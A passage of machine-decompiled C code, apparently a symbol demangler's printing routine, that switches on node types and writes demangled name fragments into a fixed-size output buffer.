(ppuStack124 = ppuStack124[2],  ppuStack124 == NULL))\n                            goto code_r0x0041510b;\n                            pppuVar22 = appuStack92 + iStack120 * 4;\n                            goto code_r0x00414b38;\n                        }\n                    }\n                    else if (1 < puVar7 - 0x4eU) goto code_r0x00412b9e;\n                }\n                ppuStack124 = ppuStack124[2];\n                if (ppuStack124 == NULL) {\n                    *(in_EAX + 0x114) = pppuVar25;\n                    goto code_r0x0041510b;\n                }\n                pppuVar22 = pppuVar25 + 4;\n                pppuVar13 = pppuVar25;\n            } while (iStack120 != 4);\n            *(in_EAX + 0x114) = pppuVar25;\n            *(in_EAX + 0x118) = 1;\n        }\n        goto code_r0x00412c6c;\n    case 4:\n        uVar2 = *(in_EAX + 0x148);\n        uVar3 = *(in_EAX + 0x114);\n        *(in_EAX + 0x148) = param_1;\n        *(in_EAX + 0x114) = 0;\n        piVar5 = param_1[2];\n        if ((((param_2 & 4) == 0) || (*piVar5 != 0)) ||\n           ((piVar5[3] != 6 || (iVar20 = sub.msvcrt.dll_strncmp(piVar5[2], \"JArray\", 6),  iVar20 != 0)))) {\n            fcn.00411160();\n            if (in_EAX[0x104] == '<') {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                in_EAX[0x104] = 0x20;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar20 = 0;\n            }\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x3c;\n            in_EAX[0x104] = 0x3c;\n            fcn.00411160();\n            if (in_EAX[0x104] == '>') {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                in_EAX[0x104] = 0x20;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar20 = 0;\n            }\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x3e;\n            in_EAX[0x104] = 0x3e;\n        }\n        else {\n            fcn.00411160();\n            fcn.0040e030();\n        }\n        *(in_EAX + 0x114) = uVar3;\n        uVar17 = param_1[1];\n        *(in_EAX + 0x148) = uVar2;\n        uVar17 = uVar17 - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 5:\n        if (*(in_EAX + 0x120) == 0) {\n            piVar5 = fcn.0040e790();\n            if ((piVar5 == NULL) ||\n               (((*piVar5 == 0x2f && (-1 < *(in_EAX + 0x124))) && (iVar20 = fcn.0040e750(),  iVar20 == 0)))) {\n                *(in_EAX + 0x118) = 1;\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n            else {\n                puVar11 = *(in_EAX + 0x110);\n                *(in_EAX + 0x110) = *puVar11;\n                fcn.00411160();\n                uVar17 = param_1[1];\n                *(in_EAX + 0x110) = puVar11;\n                uVar17 = uVar17 - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        else {\n            pcVar16 = \"auto:\";\n            cVar12 = 'a';\n            iVar20 = *(in_EAX + 0x100);\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pcVar16 = pcVar16 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                if (pcVar16 == \"\") break;\n                cVar12 = *pcVar16;\n                iVar20 = iVar4;\n            }\n            pppuVar22 = appuStack92;\n            sub.msvcrt.dll_sprintf(pppuVar22, 0x503b67, param_1[2] + 1);\n            pppuVar13 = pppuVar22;\n            do {\n                pppuVar25 = pppuVar13;\n                uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n                uVar17 = uVar6 & 0x80808080;\n                pppuVar13 = pppuVar25 + 1;\n            } while (uVar17 == 0);\n            bVar27 = (uVar6 & 0x8080) == 0;\n            if (bVar27) {\n                uVar17 = uVar17 >> 0x10;\n            }\n            if (bVar27) {\n                pppuVar13 = pppuVar25 + 6;\n            }\n            puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n            if (puVar15 != NULL) {\n                pppuVar13 = pppuVar22 + puVar15;\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *pppuVar22;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    pppuVar22 = pppuVar22 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (pppuVar13 != pppuVar22);\n            }\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 6:\n        uVar17 = param_1[2];\n        if (uVar17 == 0) {\n            pcVar16 = \"this\";\n            cVar12 = 't';\n            iVar20 = *(in_EAX + 0x100);\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pcVar16 = pcVar16 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                if (pcVar16 == \"\") break;\n                cVar12 = *pcVar16;\n                iVar20 = iVar4;\n            }\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            puVar15 = 0x503d51;\n            uVar26 = 0x7b;\n            iVar20 = *(in_EAX + 0x100);\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                if (puVar15 == 0x503d56) break;\n                uVar26 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar20 = iVar4;\n            }\n            pppuVar22 = appuStack92;\n            sub.msvcrt.dll_sprintf(pppuVar22, 0x503b67, uVar17);\n            pppuVar13 = pppuVar22;\n            do {\n                pppuVar25 = pppuVar13;\n                uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n                uVar17 = uVar6 & 0x80808080;\n                pppuVar13 = pppuVar25 + 1;\n            } while (uVar17 == 0);\n            bVar27 = (uVar6 & 0x8080) == 0;\n            if (bVar27) {\n                uVar17 = uVar17 >> 0x10;\n            }\n            if (bVar27) {\n                pppuVar13 = pppuVar25 + 6;\n            }\n            puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n            if (puVar15 != NULL) {\n                pppuVar13 = pppuVar22 + puVar15;\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *pppuVar22;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    pppuVar22 = pppuVar22 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (pppuVar13 != pppuVar22);\n            }\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x7d;\n            in_EAX[0x104] = 0x7d;\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 7:\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 8:\n        if (*(in_EAX + 0x100) == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            *(in_EAX + 0x100) = 0;\n        }\n        iVar20 = *(in_EAX + 0x100);\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7e;\n        in_EAX[0x104] = 0x7e;\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 9:\n        puVar15 = 0x503b7f;\n        uVar26 = 0x76;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503b89) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 10:\n        puVar15 = 0x503b8b;\n        uVar26 = 0x56;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503b92) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xb:\n        puVar15 = 0x503b94;\n        uVar26 = 99;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503bab) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        pcVar16 = \"-in-\";\n        fcn.00411160();\n        cVar12 = '-';\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            pcVar16 = pcVar16 + 1;\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = cVar12;\n            in_EAX[0x104] = cVar12;\n            if (pcVar16 == \"\") break;\n            cVar12 = *pcVar16;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xc:\n        puVar15 = 0x503bb2;\n        uVar26 = 0x74;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503bbe) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xd:\n        puVar15 = 0x503bc0;\n        uVar26 = 0x74;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503bd1) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xe:\n        puVar15 = 0x503bd3;\n        uVar26 = 0x74;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503be2) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xf:\n        puVar15 = 0x503be4;\n        uVar26 = 0x6e;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503bf8) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x10:\n        puVar15 = 0x503bfa;\n        uVar26 = 0x76;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503c0a) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x11:\n        puVar15 = 0x503c0c;\n        uVar26 = 99;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503c25) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x12:\n        puVar15 = 0x503c27;\n        uVar26 = 0x6a;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503c35) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x13:\n        puVar15 = 0x503c37;\n        uVar26 = 0x67;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503c49) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x14:\n        puVar15 = 0x503c4b;\n        uVar26 = 0x54;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503c60) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x15:\n        puVar15 = 0x503c62;\n        uVar26 = 0x54;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503c7a) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x16:\n        puVar15 = 0x503c7c;\n        uVar26 = 0x72;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503c90) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        pcVar16 = \" for \";\n        fcn.00411160();\n        cVar12 = ' ';\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            pcVar16 = pcVar16 + 1;\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = cVar12;\n            in_EAX[0x104] = cVar12;\n            if (pcVar16 == \"\") break;\n            cVar12 = *pcVar16;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x17:\n        puVar15 = 0x503c98;\n        uVar26 = 0x68;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503ca8) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x18:\n        puVar15 = param_1[2];\n        if (param_1[3] != 0) {\n            puVar10 = puVar15 + param_1[3];\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                uVar26 = *puVar15;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    iVar20 = 0;\n                    (**(in_EAX + 0x108))();\n                    iVar4 = 1;\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                puVar15 = puVar15 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar20 = iVar4;\n            } while (puVar10 != puVar15);\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n        appuStack92[0] = *(in_EAX + 0x114);\n        for (ppuVar21 = appuStack92[0]; appuStack92[1] = param_1,  ppuVar21 != NULL; ppuVar21 = *ppuVar21) {\n            if (ppuVar21[2] == NULL) {\n                if (2 < *ppuVar21[1] - 0x19) {\n                    ppuStack128 = NULL;\n                    break;\n                }\n                if (uVar6 == *ppuVar21[1]) {\n                    fcn.00411160();\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                    goto code_r0x00411361;\n                }\n            }\n        }\ncode_r0x004128c8:\n        *(in_EAX + 0x114) = appuStack92;\n        appuStack92[3] = *(in_EAX + 0x110);\n        goto code_r0x00412849;\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x1f:\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x25:\n    case 0x26:\n    case 0x4c:\n    case 0x4e:\n    case 0x4f:\ncode_r0x00412815:\n        appuStack92[0] = *(in_EAX + 0x114);\n        *(in_EAX + 0x114) = appuStack92;\n        appuStack92[3] = *(in_EAX + 0x110);\n        appuStack92[1] = param_1;\ncode_r0x00412849:\n        appuStack92[2] = NULL;\n        fcn.00411160();\n        if (appuStack92[2] == NULL) {\n            fcn.00415af0();\n        }\n        *(in_EAX + 0x114) = appuStack92[0];\n        if (ppuStack128 != NULL) {\n            *(in_EAX + 0x110) = iStack120;\n        }\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x23:\n    case 0x24:\n        puVar7 = param_1[2];\n        uVar17 = *puVar7;\n        if ((*(in_EAX + 0x120) != 0) || (ppuStack128 = NULL,  uVar17 != 5)) goto code_r0x004127f3;\n        ppuVar21 = *(in_EAX + 0x130);\n        iVar4 = *(in_EAX + 0x134);\n        if (iVar4 < 1) {\ncode_r0x00414a5d:\n            if (*(in_EAX + 0x138) <= iVar4) {\ncode_r0x004158f9:\n                *(in_EAX + 0x118) = 1;\n                uVar17 = param_1[1] - 1;\n                break;\n            }\n            *(in_EAX + 0x134) = iVar4 + 1;\n            puVar11 = *(in_EAX + 0x110);\n            ppuVar21[iVar4 * 2] = puVar7;\n            ppuStack128 = ppuVar21 + iVar4 * 2 + 1;\n            for (; puVar11 != NULL; puVar11 = *puVar11) {\n                iVar4 = *(in_EAX + 0x140);\n                if (*(in_EAX + 0x144) <= iVar4) goto code_r0x004158f9;\n                ppuVar21 = *(in_EAX + 0x13c) + iVar4 * 8;\n                *(in_EAX + 0x140) = iVar4 + 1;\n                ppuVar21[1] = puVar11[1];\n                *ppuStack128 = ppuVar21;\n                ppuStack128 = ppuVar21;\n            }\n            *ppuStack128 = NULL;\ncode_r0x00414adb:\n            puVar7 = fcn.0040e790();\n            ppuStack128 = NULL;\n            if (puVar7 != NULL) goto code_r0x00415393;\n        }\n        else {\n            ppuVar9 = &puStack108;\n            ppuStack128 = ppuVar21;\n            if (puVar7 != *ppuVar21) {\n                iVar8 = 0;\n                do {\n                    ppuStack128 = ppuStack128 + 2;\n                    iVar8 = iVar8 + 1;\n                    if (iVar4 == iVar8) goto code_r0x00414a5d;\n                } while (puVar7 != *ppuStack128);\n            }\n            do {\n                if ((puVar7 == *ppuVar9) || ((param_1 == *ppuVar9 && (ppuVar9 != &puStack108)))) goto code_r0x00414adb;\n                ppuVar21 = ppuVar9 + 1;\n                ppuVar9 = *ppuVar21;\n            } while (*ppuVar21 != NULL);\n            iStack120 = *(in_EAX + 0x110);\n            *(in_EAX + 0x110) = ppuStack128[1];\n            puVar7 = fcn.0040e790();\n            ppuStack128 = 0x1;\n            if (puVar7 != NULL) {\ncode_r0x00415393:\n                uVar17 = *puVar7;\n                if (uVar17 == 0x2f) {\n                    if (-1 < *(in_EAX + 0x124)) {\n                        puVar7 = fcn.0040e750();\n                        if (puVar7 == NULL) {\n                            if (ppuStack128 == NULL) goto code_r0x00414af7;\n                            goto code_r0x00415823;\n                        }\n                        uVar17 = *puVar7;\n                        goto code_r0x004127f3;\n                    }\n                    appuStack92[1] = param_1;\n                    if (*param_1 == 0x2f) {\n                        appuStack92[1] = puVar7;\n                    }\n                }\n                else {\ncode_r0x004127f3:\n                    appuStack92[1] = puVar7;\n                    if (((uVar17 != 0x23) && (*param_1 != uVar17)) && (appuStack92[1] = param_1,  uVar17 == 0x24))\n                    goto code_r0x00412815;\n                }\n                appuStack92[0] = *(in_EAX + 0x114);\n                goto code_r0x004128c8;\n            }\ncode_r0x00415823:\n            *(in_EAX + 0x110) = iStack120;\n        }\ncode_r0x00414af7:\n        *(in_EAX + 0x118) = 1;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x27:\n        puVar11 = param_1[2];\n        if ((param_2 & 4) == 0) {\n            puVar15 = *puVar11;\n            if (puVar11[1] != 0) {\n                puVar10 = puVar15 + puVar11[1];\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *puVar15;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    